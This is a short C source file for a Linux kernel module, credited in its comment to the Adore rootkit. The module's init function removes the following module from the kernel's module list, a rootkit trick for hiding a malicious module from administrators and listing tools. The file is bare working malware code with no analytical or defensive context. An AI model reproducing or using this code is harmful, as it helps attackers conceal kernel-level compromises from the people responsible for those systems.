/* riped from Adore */

#define __KERNEL__
#define MODULE

#ifdef _MODVERSIONS
#include <linux/modversions.h>
#endif

#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/string.h>

int init_module()
{
    if (__this_module.next)
        __this_module.next = __this_module.next->next;

    return 0;
}

int cleanup_module()
{
    return 0;
}
